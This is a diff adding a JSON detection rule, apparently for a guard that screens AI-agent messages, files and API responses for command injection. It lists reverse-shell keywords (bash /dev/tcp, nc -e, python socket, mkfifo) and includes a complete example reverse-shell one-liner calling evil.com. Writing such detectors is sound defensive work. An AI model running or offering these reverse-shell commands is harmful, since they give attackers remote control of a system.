@@ -1,0 +1,40 @@
+{
+  "id": "GLS-CI-002",
+  "name": "Reverse shell patterns",
+  "version": "1.0",
+  "category": "command_injection",
+  "severity": "critical",
+  "channels": [
+    "message",
+    "file",
+    "api_response"
+  ],
+  "description": "Reverse shell patterns that give remote access to the system.",
+  "keywords": [
+    "bash -i >& /dev/tcp",
+    "nc -e /bin/sh",
+    "nc -e /bin/bash",
+    "python -c 'import socket",
+    "perl -e 'use Socket",
+    "ruby -rsocket",
+    "/dev/tcp/",
+    "mkfifo /tmp/",
+    "ncat -e"
+  ],
+  "regex": [],
+  "examples": {
+    "malicious": [
+      "bash -i >& /dev/tcp/evil.com/4444 0>&1",
+      "python -c 'import socket,subprocess,os;'"
+    ],
+    "benign": [
+      "Reverse shells are explained in the security training docs.",
+      "The /dev/tcp path is a bash feature for TCP connections."
+    ]
+  },
+  "references": [
+    "https://genai.owasp.org/llmrisk/llm01-prompt-injection/"
+  ],
+  "contributed_by": "AZ Rollin",
+  "date_added": "2026-03-28"
+}
